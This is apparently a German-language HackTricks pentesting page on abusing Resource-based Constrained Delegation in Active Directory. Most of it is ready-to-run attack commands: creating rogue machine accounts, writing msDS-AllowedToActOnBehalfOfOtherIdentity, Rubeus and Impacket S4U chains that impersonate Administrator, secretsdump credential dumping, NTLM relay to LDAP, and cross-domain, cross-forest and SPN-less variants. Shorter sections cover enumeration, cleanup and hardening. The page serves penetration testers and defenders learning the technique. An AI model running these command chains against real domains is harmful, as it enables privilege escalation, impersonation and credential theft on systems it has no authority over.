# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der Resource-based Constrained Delegation

Resource-based constrained delegation (RBCD) ähnelt der [constrained delegation](constrained-delegation.md), aber die Vertrauensrichtung ist umgekehrt. Bei der herkömmlichen constrained delegation wird festgehalten, an welche Dienste ein Principal delegieren darf; bei RBCD wird auf der **Zielressource** festgehalten, welche Principals sich gegenüber dieser Ressource als Benutzer ausgeben dürfen.<sup>[[12]](#references)</sup>

Das Attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ des Zielobjekts enthält einen Sicherheitsdeskriptor, der die Principals identifiziert, die gegenüber dieser Ressource im Namen anderer Identitäten handeln dürfen.

Ein weiterer wichtiger Unterschied besteht darin, dass ein Principal mit ausreichenden **Schreibberechtigungen für ein Computerkonto** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` und ähnliche Rechte) möglicherweise _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann. Für die Konfiguration herkömmlicher constrained delegation ist normalerweise ein höher privilegierter administrativer Zugriff erforderlich.<sup>[[1]](#references)</sup>

Genauer gesagt wird das Ändern klassischer Einstellungen für constrained delegation normalerweise durch `SeEnableDelegationPrivilege` auf einem Domain Controller beschränkt. Dieses Recht besitzen typischerweise hochprivilegierte Administratoren. Bei RBCD wird die Entscheidung auf den Sicherheitsdeskriptor des Zielobjekts verlagert, sodass Schreibzugriff auf die relevante Eigenschaft des Computerobjekts ausreichen kann, auch ohne dieses Benutzerrecht.<sup>[[1]](#references)[[2]](#references)</sup>

### Neue Konzepte

Das Flag **`TrustedToAuthForDelegation`** in `userAccountControl` wird oft als Voraussetzung für **S4U2Self** beschrieben, doch das ist unvollständig.\
Ein Service Principal mit einem SPN kann S4U2Self auch ohne dieses Flag anfordern. Mit `TrustedToAuthForDelegation` ist das zurückgegebene Service Ticket **forwardable**; ohne das Flag ist das Ticket normalerweise **non-forwardable**.<sup>[[5]](#references)</sup>

Herkömmliche constrained delegation lehnt im S4U2Proxy-Schritt ein **non-forwardable TGS** ab. RBCD kann dieses S4U2Self-Ticket akzeptieren, wenn der Sicherheitsdeskriptor des Ziels den anfragenden Dienst autorisiert.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Angriffsablauf

> Wenn du **Schreibrechte oder gleichwertige Berechtigungen** für ein **Computerkonto** hast, kannst du möglicherweise privilegierten Zugriff auf diesen Computer erhalten.

Angenommen, der Angreifer hat bereits **Schreibrechte oder gleichwertige Berechtigungen für das Computerobjekt des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto mit einem **SPN** oder **erstellt eines** („Service A“). Standardmäßig kann ein authentifizierter Domain-Benutzer bis zu 10 Computerobjekte erstellen, festgelegt durch **_MachineAccountQuota_**; ein Computerobjekt stellt automatisch nutzbare SPNs bereit.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** für den Computer des Opfers (ServiceB), um **resource-based constrained delegation so zu konfigurieren, dass ServiceA sich gegenüber diesem Computer des Opfers (ServiceB) als beliebiger Benutzer ausgeben darf**.
3. Der Angreifer verwendet Rubeus, um von Service A zu Service B einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) für einen Benutzer **mit privilegiertem Zugriff auf Service B** auszuführen.
   1. S4U2Self (vom kompromittierten oder erstellten SPN-Konto): ein **TGS anfordern, der Administrator gegenüber Service A repräsentiert** (non-forwardable).
   2. S4U2Proxy: mit diesem **non-forwardable TGS** ein Service Ticket anfordern, das **Administrator** gegenüber dem **Computer des Opfers** repräsentiert.
   3. Das non-forwardable Ticket kann in diesem RBCD-Ablauf trotzdem funktionieren, weil Service A im Sicherheitsdeskriptor der Zielressource autorisiert ist.
4. Der Angreifer kann **pass-the-ticket** verwenden und sich als der Benutzer **ausgeben**, um **Zugriff auf den ServiceB des Opfers** zu erhalten.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` verhindert den standardmäßigen Weg über das Erstellen von Computerkonten, beseitigt aber weder Schreibrechte für das Zielcomputerobjekt noch die Kontrolle über ein bestehendes Konto. Ein kontrollierter normaler Benutzer ohne SPN kann manchmal als delegierender Principal über die [SPN-less U2U-Methode](#spn-less-cross-domain--cross-forest-rbcd) verwendet werden, auch innerhalb einer Domain. Dieser Weg erfordert weiterhin ein wirksames RBCD-Schreibrecht, die Kontrolle über die Anmeldedaten des delegierenden Benutzers, eine delegierbare impersonierte Identität, kompatibles Kerberos-Verschlüsselungsverhalten und eine NT-Hash-Änderung, die das Konto beeinträchtigt. Betrachte diese Punkte als separate Voraussetzungen; ein leeres RBCD-Attribut oder eine Quota von null beweist für sich genommen weder Erfolg noch Sicherheit.

Ein vorhandener RBCD-Deskriptor kann auch eine **Gruppe** statt des delegierenden Computers direkt aufführen. Wenn du ein Computerkonto mit SPN kontrollierst und es zu dieser Gruppe hinzufügen kannst, kann die neue Mitgliedschaft den Delegationspfad ermöglichen, ohne das RBCD-Attribut des Zielcomputers zu ändern. Prüfe die effektive ACL der Gruppe für Mitgliedschaftsänderungen (einschließlich deny ACEs), verschachtelte Mitgliedschaften und die Aktualisierung des Tokens, die Trustee-SID im Deskriptor, Delegierungseinschränkungen des impersonierten Kontos und den Ziel-Service-SPN, bevor du davon ausgehst, dass der Pfad funktioniert.

Um den _**MachineAccountQuota**_ der Domain zu überprüfen, kannst du Folgendes verwenden:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Angriff

### Erstellen eines Computerobjekts

Du kannst mithilfe von **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup> ein Computerobjekt in der Domäne erstellen.

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurieren von Resource-based Constrained Delegation

**Mit dem Active Directory PowerShell-Modul**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Verwendung von powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Einen vollständigen S4U-Angriff durchführen (Windows/Rubeus)

Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt. Daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Dies gibt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Du kannst für weitere Dienste mehr Tickets generieren, indem du Rubeus einfach einmal mit dem Parameter `/altservice` aufrufst:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Benutzer können als **"Account is sensitive and cannot be delegated."** markiert werden. Wenn dieses Flag aktiviert ist, kann das Konto über diesen Delegationsablauf nicht imitiert werden. BloodHound zeigt diese Eigenschaft während der Analyse an.

### Linux-Tools: RBCD von Anfang bis Ende mit Impacket (2024+)

Wenn Sie Linux verwenden, können Sie die vollständige RBCD-Kette mit den offiziellen Impacket-Tools ausführen:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notizen
- Wenn LDAP-Signing/LDAPS erzwungen wird, verwende `impacket-rbcd -use-ldaps ...`.
- Bevorzuge AES-Schlüssel; viele moderne Domänen schränken RC4 ein. Impacket und Rubeus unterstützen beide reine AES-Abläufe.
- Impacket kann für einige Tools den `sname` („AnySPN“) umschreiben. Ermittle aber nach Möglichkeit den korrekten SPN (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## Domänenübergreifendes und forestübergreifendes RBCD

Wenn sich der **delegierende Principal**, den du kontrollierst, in einer **anderen Domäne** (oder sogar einem **anderen Forest**) als der **Ressourcencomputer** befindet, handelt es sich weiterhin um **RBCD**. Der Ticket-Ablauf entspricht dann jedoch nicht mehr dem üblichen `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domäne.

### Domänenübergreifendes RBCD: den fremden Principal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domäne** festlegst, ist der fremde Computer/Benutzer im LDAP der Zieldomäne möglicherweise **nicht über seinen Namen auflösbar**. Konfiguriere in diesem Fall den Delegierungseintrag mithilfe der **SID** des fremden Principals statt seiner sAMAccountName/UPN.

Das ist besonders relevant, wenn NTLM an LDAP mit `ntlmrelayx.py` weitergeleitet wird:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Das ist erforderlich, wenn das delegierende Konto einer fremden Zieldomäne angehört.
- Selbst wenn das Tool `User not found in LDAP` ausgibt, kann das Schreiben der Delegierung dennoch erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domainübergreifendes RBCD: Cross-Realm-S4U-Ablauf

Sobald der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` eingetragen ist, sieht der funktionierende domainübergreifende Ablauf so aus:<sup>[[9]](#references)[[13]](#references)</sup>

1. Ein **TGT** für den delegierenden Principal aus dessen eigener Domäne abrufen.
2. Ein **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Auf dem DC der Zieldomäne ein **Cross-Realm-S4U2Self-Referral** für den zu imitierenden Benutzer anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer zurück in der Domäne des Delegierenden anfordern.
5. **S4U2Proxy** in der Domäne des Delegierenden ausführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem DC der Zieldomäne ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Deshalb scheitern die standardmäßigen Linux-Tools bei domainübergreifendem RBCD häufig:<sup>[[9]](#references)</sup>
- Die **Realm**-Angabe der Anfrage muss sich möglicherweise von der Realm des im `TGS-REQ` verwendeten TGT unterscheiden.
- Die Kette erfordert **unabhängige S4U2Proxy-Schritte** und nicht nur `S4U2Self` oder ein direkt von einem einzelnen `S4U2Proxy` gefolgtes `S4U2Self`.

### Domainübergreifendes RBCD unter Linux

Synacktiv veröffentlichte eine Impacket-Implementierung von `getST.py`, die den Cross-Realm-Ablauf unter Linux nachbildet, indem sie die beiden KDCs explizit berücksichtigt:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativ lauten die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domäne
- `-targetdomain`: Domäne des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**domäne

### Einschränkungen bei Cross-Forest-RBCD

Cross-Forest-RBCD hat eine wichtige Einschränkung: **Der impersonierte Benutzer muss derselben Gesamtstruktur angehören wie der delegierende Principal**. Mit anderen Worten: Wenn sich dein kontrolliertes Maschinenkonto in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du im Allgemeinen **keine beliebigen `asgard.local`-Benutzer über RBCD gegenüber dieser Ressource impersonieren**.<sup>[[9]](#references)</sup>

Die Technik ist weiterhin ausnutzbar, wenn:
- der Benutzer aus der **delegierenden Gesamtstruktur** auf dem Ressourcenhost in der anderen Gesamtstruktur **lokaler Administrator** (oder anderweitig privilegiert) ist
- eine Vertrauensstellung den erforderlichen Authentifizierungspfad ermöglicht und die fremde SID im Sicherheitsdeskriptor des Zielcomputers akzeptiert wird

### Protokollbesonderheiten bei Cross-Forest-RBCD

Cross-Forest-RBCD ist nicht einfach „Cross-Domain plus eine Vertrauensstellung“. Der beobachtete Ablauf weist zwei Besonderheiten auf, die von gängigen Tools lange übersehen wurden:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein abschließendes Service-Ticket, das auch dann mit **RC4** zurückgegeben werden kann, wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Ein TGT für den delegierenden Principal in Gesamtstruktur A abrufen.
2. **S4U2Self** für den zu impersonierenden Benutzer in Gesamtstruktur A anfordern.
3. **S4U2Proxy** in Gesamtstruktur A anfordern, um ein Referral-TGT für Gesamtstruktur B zu erhalten.
4. Eine zweite **S4U2Proxy**-Anfrage in Gesamtstruktur A senden, **ohne** das S4U2Self-Ticket als zusätzliches Ticket, aber mit aktiviertem `branch-aware`, um ein weiteres Referral-TGT für Gesamtstruktur B zu erhalten.
5. Optional ein normales Service-Ticket in Gesamtstruktur B für den delegierenden Principal anfordern (dieses Ticket ist für den abschließenden Missbrauch nicht erforderlich).
6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das abschließende **S4U2Proxy**-Ticket in Gesamtstruktur B für den zu impersonierenden Benutzer aus Gesamtstruktur A zum Ziel-SPN anzufordern.

### Cross-Forest-RBCD unter Linux

Derselbe Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Schalter hinzu:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekursives Multi-Domain-RBCD (3+ Domänen)

In **Multi-Domain-Forests** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, statt nach einer Weiterleitung anzuhalten:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domäne des impersonierten Benutzers** gesendet, dazwischenliegende übergeordnete/untergeordnete Domänen werden mit normalen `TGS-REQ`-Weiterleitungen für `krbtgt/<REALM>` durchlaufen, und das **letzte `S4U2Self`** wird in der **eigenen Domäne des delegierenden Principals** gesendet.
- Das bedeutet, dass **allein der Besitz eines TGT** für ein Maschinenkonto ausreichen kann, um sich als **Admin aus einer anderen Domäne desselben Forests** auszugeben und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt auf dieselbe Weise der Trust-Kette: Dazwischenliegende Hops verwenden das vorherige Ticket erneut als TGT und fordern dabei die nächste `krbtgt/<REALM>`-Weiterleitung an. Nur der letzte Hop gibt das endgültige Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less RBCD über Domänengrenzen hinweg / forestübergreifend

Wenn der **delegierende Principal ein Benutzer ohne SPN** ist, schlägt das letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Als Workaround wird **nur der letzte Schritt mit `S4U2Self+U2U` wiederholt**.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC **RC4-HMAC (etype 23)** bevorzugt.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Sitzungsschlüssel** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers mit `changepasswd.py -newhashes <session_key>` durch diesen **Sitzungsschlüssel** ersetzen.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage als **`-additional-ticket`** wiederverwenden.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Operative Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware**-Algorithmus (`getST.py ... -forest`) verwendet werden, um das native Verhalten von Windows nachzubilden. Wird die fremde Forest erst **später** in der Kette erreicht, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen DCs mit **Windows Server 2022/2025** kann erzwungenes RC4 aufgrund der RC4-Veraltung mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen. Dadurch kann **SPN-less RBCD** unmöglich werden, obwohl klassisches SPN-basiertes RBCD mit AES weiterhin funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` aus, bevor du den Hash/das Passwort des Benutzers änderst**: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Eine vorherige Passwortänderung kann daher spätere Ticketanfragen beeinträchtigen.<sup>[[14]](#references)</sup>
- Das impersonierte Konto muss weiterhin **delegierbar** sein: **Protected Users** und Konten mit **`NOT_DELEGATED`** / **„Konto ist vertraulich und kann nicht delegiert werden“** blockieren die Kette.

## Hinweise zur Erkennung / Härtung

- RBCD-Pfade über Domains/Forests hinweg werden weiterhin meist durch **ACL-Missbrauch** oder **Relay-to-LDAP** eingerichtet. Erzwinge **LDAP signing** und **LDAP channel binding** auf DCs, um gängige Einrichtungswege zu blockieren.
- Überprüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` für Computerobjekte schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Überprüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und, ob Benutzer aus einer fremden Forest **lokale Administratorrechte** auf Ressourcenhosts besitzen.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff aus und injiziert den TGS** von Administrator zum Zielhost in den **Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, sodass du auf **C$** zugreifen kannst:

```bash
ls \\victim.domain.local\C$
```

### Verschiedene Service-Tickets missbrauchen

Erfahre mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Audit und Bereinigung

### Computer mit konfiguriertem RBCD aufzählen

PowerShell (Dekodierung der SD zum Auflösen von SIDs):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (mit einem Befehl lesen oder leeren):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Übergib Rubeus mindestens den AES256-Hash (oder einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** während `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Versuche den **letzten Hop** stattdessen als **`S4U2Self+U2U`** und nicht als reguläres `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** bei **SPN-less RBCD**: Neuere DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick mit `S4U2Self+U2U` und Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed** RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos daher nicht richtig funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Möglicherweise hast du beim Generieren der Hashes vergessen, das „$“ in den Benutzernamen aufzunehmen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Das kann Folgendes bedeuten:
  - Der Benutzer, den du impersonieren möchtest, kann nicht auf den gewünschten Dienst zugreifen (weil du ihn nicht impersonieren kannst oder weil er nicht über ausreichende Berechtigungen verfügt).
  - Der angeforderte Dienst existiert nicht (wenn du ein Ticket für WinRM anforderst, WinRM aber nicht läuft).
  - Der erstellte fakecomputer hat seine Berechtigungen auf dem anfälligen Server verloren und du musst sie ihm zurückgeben.
  - Du missbrauchst klassisches KCD; beachte, dass RBCD mit nicht weiterleitbaren S4U2Self-Tickets funktioniert, während KCD weiterleitbare Tickets erfordert.

## Hinweise, Relays und Alternativen

- Du kannst den RBCD SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig mit RBCD, um in einem Schritt lokalen SYSTEM-Zugriff zu erlangen. Beispiele aus der Praxis von Anfang bis Ende:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Wenn LDAP-Signing/Channel Binding **deaktiviert** sind und du ein Computerkonto erstellen kannst, können Tools wie **KrbRelayUp** eine erzwungene Kerberos-Authentifizierung an LDAP weiterleiten, `msDS-AllowedToActOnBehalfOfOtherIdentity` für dein Computerkonto auf dem Zielcomputerobjekt setzen und dich anschließend direkt über S4U von einem anderen Host aus als **Administrator** impersonieren.<sup>[[8]](#references)</sup>

## References

- [1] [Mit dem Hund wedeln: Missbrauch von Resource-Based Constrained Delegation zum Angriff auf Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Ein weiteres Wort zur Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
- [3] [Kerberos Resource-based Constrained Delegation: Übernahme eines Computerobjekts](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [4] [Netwrix – Missbrauch von Resource-Based Constrained Delegation](https://netwrix.com/en/resources/blog/resource-based-constrained-delegation-abuse/)
- [5] [Kerberosity zerstörte die Domäne: Ein offensiver Überblick über Kerberos](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- [6] [Impacket rbcd.py (offiziell)](https://github.com/fortra/impacket/blob/master/examples/rbcd.py)
- [7] [Kurzes Linux-Spickzettel mit aktueller Syntax](https://tldrbins.github.io/rbcd/)
- [8] [0xdf – HTB Bruno (LDAP-Signing deaktiviert → Kerberos-Relay zu RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [9] [Synacktiv – Untersuchung von domänen- und forestübergreifendem RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [10] [Synacktiv – Untersuchung von domänen- und forestübergreifendem RBCD: Teil 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [11] [Synacktiv-Impacket-Branch – cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [12] [Microsoft Learn – Übersicht über Kerberos Constrained Delegation](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications – Domänenübergreifendes S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications – SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn – Erkennen und Beheben der RC4-Nutzung in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Details zu S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
{{#include ../../banners/hacktricks-training.md}}
